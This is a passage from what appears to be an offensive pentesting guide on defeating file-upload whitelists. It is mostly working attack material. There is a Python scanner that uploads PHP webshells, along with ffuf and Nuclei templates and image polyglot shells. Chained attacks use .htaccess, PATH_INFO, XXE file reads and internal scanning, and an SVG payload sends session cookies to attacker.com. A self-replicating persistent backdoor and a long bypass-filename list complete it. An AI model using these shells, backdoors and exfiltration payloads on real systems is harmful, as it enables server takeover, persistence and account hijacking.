                filename = f"case_test.{variant}"
                status = self.upload(filename, self.php_shell)
                if status in [200, 201]:
                    url = self.check_execution(filename)
                    if url:
                        self.results.append(('case', filename, url))
                        print(f"  [+] RCE: .{variant}")
                        return True
        return False
    
    def test_alternative_extensions(self):
        print("\n[*] Testing alternative extensions...")
        alt_exts = [
            'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8',
            'phtml', 'pht', 'phps', 'phar', 'pgif', 'shtml',
            'inc', 'module'
        ]
        
        for ext in alt_exts:
            filename = f"alt_test.{ext}"
            status = self.upload(filename, self.php_shell)
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('alt_ext', filename, url))
                    print(f"  [+] RCE: .{ext}")
        
    def test_double_extensions(self):
        print("\n[*] Testing double extensions...")
        exec_exts = ['php', 'phtml', 'pht', 'php5']
        safe_exts = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt']
        unknown_exts = ['xxx', 'abc', 'zzz', 'foobar', 'aaa']
        
        payloads = []
        for e in exec_exts:
            for s in safe_exts:
                payloads.append(f"test.{e}.{s}")
                payloads.append(f"test.{s}.{e}")
            for u in unknown_exts:
                payloads.append(f"test.{e}.{u}")
        
        for filename in payloads:
            status = self.upload(filename, self.php_shell)
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('double_ext', filename, url))
                    print(f"  [+] RCE: {filename}")
    
    def test_trailing_characters(self):
        print("\n[*] Testing trailing characters...")
        payloads = [
            'shell.php.', 'shell.php..', 'shell.php...',
            'shell.php%20', 'shell.php%0a', 'shell.php%0d%0a',
            'shell.php::$DATA', 'shell.php::$DATA.jpg',
            'shell.php%00.jpg', 'shell.php%2500.jpg',
        ]
        
        for filename in payloads:
            status = self.upload(filename, self.php_shell)
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('trailing', filename, url))
                    print(f"  [+] Uploaded: {filename}")
    
    def test_mime_spoofing(self):
        print("\n[*] Testing MIME type spoofing...")
        mimes = [
            'image/jpeg', 'image/png', 'image/gif',
            'application/octet-stream', 'text/plain',
            '', 'invalid', 'image/*'
        ]
        
        for mime in mimes:
            filename = f"mime_test.php"
            status = self.upload(filename, self.php_shell, mime)
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    label = mime or '[EMPTY]'
                    self.results.append(('mime', f"{filename} ({label})", url))
                    print(f"  [+] Bypass with Content-Type: {label}")
                    return True
        return False
    
    def test_polyglot(self):
        print("\n[*] Testing polyglot files...")
        
        # GIF polyglot
        gif_poly = b'GIF89a' + self.php_shell.encode()
        for filename in ['poly.gif', 'poly.gif.php', 'poly.php.gif']:
            status = self.upload(filename, gif_poly, 'image/gif')
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('polyglot', f"GIF {filename}", url))
                    print(f"  [+] GIF polyglot: {filename}")
        
        # JPEG polyglot
        jpeg_poly = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' + self.php_shell.encode()
        for filename in ['poly.jpg', 'poly.jpg.php', 'poly.php.jpg']:
            status = self.upload(filename, jpeg_poly, 'image/jpeg')
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('polyglot', f"JPEG {filename}", url))
                    print(f"  [+] JPEG polyglot: {filename}")
        
        # PNG polyglot
        png_poly = b'\x89PNG\r\n\x1a\n' + self.php_shell.encode()
        for filename in ['poly.png', 'poly.png.php', 'poly.php.png']:
            status = self.upload(filename, png_poly, 'image/png')
            if status in [200, 201]:
                url = self.check_execution(filename)
                if url:
                    self.results.append(('polyglot', f"PNG {filename}", url))
                    print(f"  [+] PNG polyglot: {filename}")
    
    def test_path_info(self):
        print("\n[*] Testing PATH_INFO exploitation...")
        
        gif_shell = b'GIF89a<?php echo "PATHINFO_BYPASS"; system($_GET["cmd"]); ?>'
        self.upload('pathinfo_test.gif', gif_shell, 'image/gif')
        
        suffixes = [
            '/x.php', '/.php', '/shell.php', '/a.php',
            '/x.phtml', '%00.php', '%0a.php'
        ]
        
        for suffix in suffixes:
            url = f"{self.access_base}/pathinfo_test.gif{suffix}?cmd=id"
            try:
                r = self.session.get(url, timeout=5)
                if 'PATHINFO_BYPASS' in r.text:
                    self.results.append(('pathinfo', f"pathinfo_test.gif{suffix}", url))
                    print(f"  [+] PATH_INFO: pathinfo_test.gif{suffix}")
                    return True
            except:
                pass
        return False
    
    def test_iis_semicolon(self):
        print("\n[*] Testing IIS semicolon parsing...")
        payloads = [
            'shell.asp;.jpg', 'shell.aspx;.jpg',
            'shell.asp;.png', 'shell.aspx;.png',
            'shell.asp;test.jpg', 'shell.aspx;anything.gif'
        ]
        
        for filename in payloads:
            status = self.upload(filename, self.asp_shell)
            if status in [200, 201]:
                self.results.append(('iis_semicolon', filename, 'uploaded'))
                print(f"  [+] Uploaded: {filename}")
    
    def run_all(self):
        print(f"[*] Target: {self.upload_url}")
        print(f"[*] Access: {self.access_base}")
        print(f"[*] Starting whitelist bypass scan...\n")
        
        self.test_case_variations()
        self.test_alternative_extensions()
        self.test_double_extensions()
        self.test_trailing_characters()
        self.test_mime_spoofing()
        self.test_polyglot()
        self.test_path_info()
        self.test_iis_semicolon()
        
        print(f"\n{'='*60}")
        print(f"[*] RESULTS: {len(self.results)} bypass(es) found")
        for technique, payload, url in self.results:
            print(f"  [{technique}] {payload}")
            print(f"    → {url}")
        
        return len(self.results) > 0

if __name__ == '__main__':
    scanner = WhitelistBypassScanner(
        target=sys.argv[1],
        upload_path=sys.argv[2],
        access_path=sys.argv[3],
        cookie=sys.argv[4]
    )
    scanner.run_all()
```
::

### ffuf Extension Fuzzing

::code-group
```bash [Extension Fuzzing]
# Fuzz extensions with ffuf
# Create extension wordlist
cat > extensions.txt << 'EOF'
php
php2
php3
php4
php5
php6
php7
php8
phtml
pht
phps
phar
pgif
shtml
shtm
stm
inc
module
Php
pHp
phP
PHp
pHP
PhP
PHP
php.jpg
php.png
php.gif
jpg.php
png.php
gif.php
php.xxx
php.abc
php.zzz
php.
php..
php%20
php%0a
php%00.jpg
php::$DATA
asp
aspx
ashx
asmx
cer
asa
asp;.jpg
aspx;.jpg
jsp
jspx
jspf
war
py
pyc
rb
erb
pl
cgi
EOF

# Run ffuf
ffuf -u "https://target.com/upload" \
  -X POST \
  -H "Cookie: session=SESS" \
  -H "Content-Type: multipart/form-data; boundary=----ffufBound" \
  -d "------ffufBound\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.FUZZ\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo 'FUZZ_TEST'; ?>\r\n------ffufBound--" \
  -w extensions.txt \
  -mc 200,201 \
  -o whitelist_results.json
```

```bash [Content-Type Fuzzing]
# Fuzz Content-Type values
cat > mimetypes.txt << 'EOF'
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/svg+xml
image/tiff
image/x-icon
application/pdf
application/octet-stream
text/plain
text/html
text/xml
application/xml
application/json
application/zip
application/x-httpd-php
application/x-php
text/php
text/x-php

invalid
xyz
*/*
image/*
EOF

ffuf -u "https://target.com/upload" \
  -X POST \
  -H "Cookie: session=SESS" \
  -H "Content-Type: multipart/form-data; boundary=----ffufBound" \
  -d "------ffufBound\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: FUZZ\r\n\r\n<?php echo 'MIME_TEST'; ?>\r\n------ffufBound--" \
  -w mimetypes.txt \
  -mc 200,201 \
  -o mimetype_results.json
```
::

### Nuclei Templates

::tabs
  :::tabs-item{label="Extension Bypass"}
  ```yaml
  id: upload-extension-whitelist-bypass
  
  info:
    name: File Upload Extension Whitelist Bypass
    author: pentester
    severity: high
    tags: upload,whitelist,bypass
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: {{cookie}}
          Content-Type: multipart/form-data; boundary=----NucleiBound
  
          ------NucleiBound
          Content-Disposition: form-data; name="file"; filename="test.{{ext}}"
          Content-Type: image/jpeg
  
          <?php echo "NUCLEI_WHITELIST_BYPASS_{{ext}}"; ?>
          ------NucleiBound--
  
        - |
          GET {{BaseURL}}/uploads/test.{{ext}} HTTP/1.1
          Host: {{Hostname}}
  
      payloads:
        ext:
          - phtml
          - pht
          - php5
          - php7
          - phar
          - PhP
          - pHP
          - Php
          - php.jpg
          - php.xxx
  
      attack: pitchfork
  
      matchers:
        - type: word
          words:
            - "NUCLEI_WHITELIST_BYPASS"
          part: body
  ```
  :::

  :::tabs-item{label="MIME Bypass"}
  ```yaml
  id: upload-mime-whitelist-bypass
  
  info:
    name: File Upload MIME Type Whitelist Bypass
    author: pentester
    severity: high
    tags: upload,whitelist,mime,bypass
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: {{cookie}}
          Content-Type: multipart/form-data; boundary=----NucleiBound
  
          ------NucleiBound
          Content-Disposition: form-data; name="file"; filename="shell.php"
          Content-Type: {{mime}}
  
          <?php echo "MIME_BYPASS_CONFIRMED"; ?>
          ------NucleiBound--
  
        - |
          GET {{BaseURL}}/uploads/shell.php HTTP/1.1
          Host: {{Hostname}}
  
      payloads:
        mime:
          - image/jpeg
          - image/png
          - image/gif
          - application/octet-stream
          - text/plain
  
      attack: pitchfork
  
      matchers:
        - type: word
          words:
            - "MIME_BYPASS_CONFIRMED"
          part: body
  ```
  :::

  :::tabs-item{label="Polyglot Detection"}
  ```yaml
  id: upload-polyglot-bypass
  
  info:
    name: File Upload Polyglot Bypass
    author: pentester
    severity: critical
    tags: upload,whitelist,polyglot,bypass
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: {{cookie}}
          Content-Type: multipart/form-data; boundary=----NucleiBound
  
          ------NucleiBound
          Content-Disposition: form-data; name="file"; filename="polyglot.php.gif"
          Content-Type: image/gif
  
          GIF89a<?php echo "POLYGLOT_BYPASS_CONFIRMED"; system($_GET["cmd"]); ?>
          ------NucleiBound--
  
        - |
          GET {{BaseURL}}/uploads/polyglot.php.gif?cmd=id HTTP/1.1
          Host: {{Hostname}}
  
      matchers:
        - type: word
          words:
            - "POLYGLOT_BYPASS_CONFIRMED"
          part: body
  ```
  :::
::

## Chaining Techniques

### Chain 1 — Whitelist Bypass + .htaccess for Full Execution

::steps{level="4"}

#### Upload .htaccess (Often Not in Extension Whitelist Check)

```bash
# .htaccess has no "extension" in the traditional sense
# Some whitelists only check files with extensions
cat > ht_payload << 'EOF'
AddType application/x-httpd-php .gif .jpg .png
AddHandler php-script .gif .jpg .png
Options +ExecCGI
EOF

curl -X POST https://target.com/upload \
  -F "file=@ht_payload;filename=.htaccess;type=text/plain" \
  -H "Cookie: session=SESS"
```

#### Upload GIF Polyglot Shell

```bash
echo -n 'GIF89a<?php echo "CHAIN1_SUCCESS"; system($_GET["cmd"]); ?>' > shell.gif

curl -X POST https://target.com/upload \
  -F "file=@shell.gif;filename=avatar.gif;type=image/gif" \
  -H "Cookie: session=SESS"
```

#### Execute via Whitelisted Extension

```bash
curl "https://target.com/uploads/avatar.gif?cmd=id"
curl "https://target.com/uploads/avatar.gif?cmd=cat+/etc/passwd"
```

::

### Chain 2 — Whitelist Bypass + PATH_INFO

::steps{level="4"}

#### Upload Polyglot with Whitelisted Extension

```bash
# GIF polyglot passes both extension AND magic byte checks
echo -n 'GIF89a<?php echo "PATHINFO_CHAIN"; system($_GET["cmd"]); ?>' > poly.gif

curl -X POST https://target.com/upload \
  -F "file=@poly.gif;filename=image.gif;type=image/gif" \
  -H "Cookie: session=SESS"
```

#### Exploit Nginx/PHP PATH_INFO

```bash
# cgi.fix_pathinfo=1 makes PHP process the GIF as PHP
curl "https://target.com/uploads/image.gif/x.php?cmd=id"
curl "https://target.com/uploads/image.gif/.php?cmd=id"
curl "https://target.com/uploads/image.gif/anything.php?cmd=id"
```

::

### Chain 3 — SVG Upload + XSS + Account Takeover

::steps{level="4"}

#### Upload SVG with Cookie-Stealing JavaScript

```bash
cat > steal.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie));
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
EOF

curl -X POST https://target.com/upload \
  -F "file=@steal.svg;filename=infographic.svg;type=image/svg+xml" \
  -H "Cookie: session=SESS"
```

#### Send SVG Link to Victim

```bash
# The SVG URL executes JavaScript when viewed in a browser
echo "Payload URL: https://target.com/uploads/infographic.svg"

# If served from same origin → full cookie access
# If served from CDN → limited to CDN origin
```

#### Capture Session Cookie

```bash
# On attacker server
# Logs show: GET /log?cookie=session%3Dadmin_session_value
tail -f /var/log/nginx/access.log | grep "/log?"
```

::

### Chain 4 — XML Upload + XXE + Internal Network Scan

::steps{level="4"}

#### Upload XML with XXE to Read Files

```bash
cat > xxe_scan.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
EOF

curl -X POST https://target.com/api/import \
  -F "file=@xxe_scan.xml;filename=data.xml;type=application/xml" \
  -H "Cookie: session=SESS"
```

#### Pivot to Internal Network via XXE SSRF

```bash
cat > xxe_ssrf.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<data>&xxe;</data>
EOF

# Scan internal network
for ip in $(seq 1 254); do
  cat > scan_${ip}.xml << XMLEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.${ip}:80/">
]>
<data>&xxe;</data>
XMLEOF
  
  result=$(curl -s -X POST https://target.com/api/import \
    -F "file=@scan_${ip}.xml;filename=data.xml;type=application/xml" \
    -H "Cookie: session=SESS")
  
  echo "$result" | grep -qv "error\|connect\|refused" && \
    echo "[+] Host alive: 192.168.1.${ip}"
done
```

::

### Chain 5 — Double Extension + Apache mod_mime + Persistence

::steps{level="4"}

#### Identify Apache mod_mime Behavior

```bash
# Test if Apache processes both extensions
echo '<?php echo "MODMIME_TEST"; ?>' > test.php.jpg

curl -X POST https://target.com/upload \
  -F "file=@test.php.jpg;filename=test.php.jpg;type=image/jpeg" \
  -H "Cookie: session=SESS"

# Check if PHP executes
curl "https://target.com/uploads/test.php.jpg"
```

#### Upload Persistent Backdoor with Double Extension

```bash
cat > persist.php.gif << 'EOF'
GIF89a<?php
// Stealth: looks like GIF, executes as PHP on Apache
if(isset($_GET['cmd'])){
    echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';
}
if(isset($_GET['persist'])){
    // Create additional backdoors
    $bd = '<?php system($_GET["c"]); ?>';
    @file_put_contents(__DIR__.'/.cache.php', $bd);
    @file_put_contents(__DIR__.'/../.config.php', $bd);
    echo 'Persistence installed';
}
?>
EOF

curl -X POST https://target.com/upload \
  -F "file=@persist.php.gif;filename=banner.php.gif;type=image/gif" \
  -H "Cookie: session=SESS"

# Install persistence
curl "https://target.com/uploads/banner.php.gif?persist=1"

# Use persistent backdoor
curl "https://target.com/uploads/.cache.php?c=id"
```

::

## Comprehensive Payload Reference

::code-collapse

```bash [complete-whitelist-bypass-payloads.txt]
# === CASE MANIPULATION ===
shell.pHp
shell.PhP
shell.PHP
shell.pHP
shell.phP
shell.Php
shell.pHtml
shell.pHTml
shell.PHTML
shell.pHt
shell.PHT
shell.pHar
shell.PHAR

# === ALTERNATIVE EXTENSIONS ===
shell.php2
shell.php3
shell.php4
shell.php5
shell.php6
shell.php7
shell.php8
shell.phtml
shell.pht
shell.phps
shell.phar
shell.pgif
shell.shtml
shell.shtm
shell.stm
shell.inc
shell.module

# === DOUBLE EXTENSIONS (exec.safe) ===
shell.php.jpg
shell.php.jpeg
shell.php.png
shell.php.gif
shell.php.bmp
shell.php.pdf
shell.php.txt
shell.php.css
shell.php.ico
shell.phtml.jpg
shell.pht.png
shell.php5.gif
shell.phar.jpg

# === DOUBLE EXTENSIONS (safe.exec) ===
shell.jpg.php
shell.png.php
shell.gif.php
shell.pdf.phtml
shell.jpeg.pht
shell.jpg.php5
shell.png.phar
shell.gif.php7

# === UNKNOWN EXTENSION FALLBACK ===
shell.php.xxx
shell.php.abc
shell.php.zzz
shell.php.foobar
shell.php.aaa
shell.php.123
shell.php.test
shell.php.random
shell.phtml.qqq
shell.pht.rrr

# === TRAILING CHARACTERS ===
shell.php.
shell.php..
shell.php...
shell.php%20
shell.php%0a
shell.php%0d
shell.php%0d%0a
shell.php%09
shell.php /

# === NULL BYTE ===
shell.php%00.jpg
shell.php%00.png
shell.php%00.gif
shell.php%2500.jpg
shell.php\x00.jpg

# === NTFS / WINDOWS ===
shell.php::$DATA
shell.php::$DATA.jpg
shell.php:$DATA
shell.asp;.jpg
shell.aspx;.jpg
shell.asp;.png
shell.asp;test.jpg

# === NEWLINE / MULTILINE REGEX ===
shell.php%0a.jpg
shell.php%0d.jpg
shell.php%0d%0a.jpg
shell.php\n.jpg

# === CONFIG FILES ===
.htaccess
.htpasswd
web.config
.env
.user.ini
php.ini

# === TRIPLE / MULTI EXTENSION ===
shell.jpg.png.php
shell.gif.jpg.phtml
shell.pdf.png.php5
shell.jpg.jpeg.png.gif.php
shell.jpg.php.jpg.php

# === POLYGLOT FILENAMES ===
shell.php.gif (with GIF89a header)
shell.php.jpg (with JPEG header)
shell.php.png (with PNG header)
shell.gif (GIF89a + PHP)
shell.jpg (JPEG header + PHP)

# === ASP.NET ALTERNATIVES ===
shell.asp
shell.aspx
shell.ashx
shell.asmx
shell.axd
shell.cshtml
shell.vbhtml
shell.cer
shell.asa
shell.config
shell.svc

# === JAVA ALTERNATIVES ===
shell.jsp
shell.jspx
shell.jspf
shell.jsw
shell.jsv
shell.war

# === CGI / SCRIPT ===
shell.cgi
shell.pl
shell.py
shell.rb
shell.sh
shell.bash
shell.erb

# === COLDFUSION ===
shell.cfm
shell.cfml
shell.cfc

# === SSI ===
shell.shtml
shell.shtm
shell.stm
```
::

## Quick Reference

::field-group
  ::field{name="Extension Whitelist Bypass" type="string"}
  Test alternative extensions (`.phtml`, `.pht`, `.php5`, `.phar`), case variations (`.pHp`, `.PhP`), and double extensions (`.php.jpg`, `.php.xxx`)
  ::

  ::field{name="MIME Whitelist Bypass" type="string"}
  Set `Content-Type: image/jpeg` on PHP shell upload — the header is fully client-controlled
  ::

  ::field{name="Magic Bytes Bypass" type="string"}
  Prepend valid headers (`GIF89a`, `\xFF\xD8\xFF\xE0`, `\x89PNG`) to shell content for polyglot files
  ::

  ::field{name="Apache mod_mime" type="string"}
  `shell.php.xxx` — unknown extension `.xxx` causes Apache to fall back to `.php` handler
  ::

  ::field{name="Nginx PATH_INFO" type="string"}
  Upload `image.gif` with embedded PHP → access via `/uploads/image.gif/x.php` when `cgi.fix_pathinfo=1`
  ::

  ::field{name="IIS Semicolon" type="string"}
  `shell.asp;.jpg` — IIS processes as `.asp`, ignores everything after semicolon
  ::

  ::field{name="Windows Trailing Chars" type="string"}
  `shell.php.`, `shell.php::$DATA`, `shell.php%20` — Windows strips trailing dots, spaces, and ADS notation
  ::

  ::field{name="Null Byte Truncation" type="string"}
  `shell.php%00.jpg` — legacy PHP/Java truncates at null byte, whitelist sees `.jpg`, filesystem saves `.php`
  ::

  ::field{name="Regex Bypass" type="string"}
  Missing `i` flag → case bypass. Missing `$` anchor → `.jpg` anywhere in name. Multiline mode → `%0a.jpg` tricks `$`
  ::

  ::field{name="Non-Code Abuse" type="string"}
  SVG → XSS/SSRF, XML → XXE, HTML → XSS, CSV → formula injection, PDF → JavaScript execution
  ::
::

::badge
File Upload — Whitelist Misconfiguration — Extension Bypass — Polyglot — RCE
::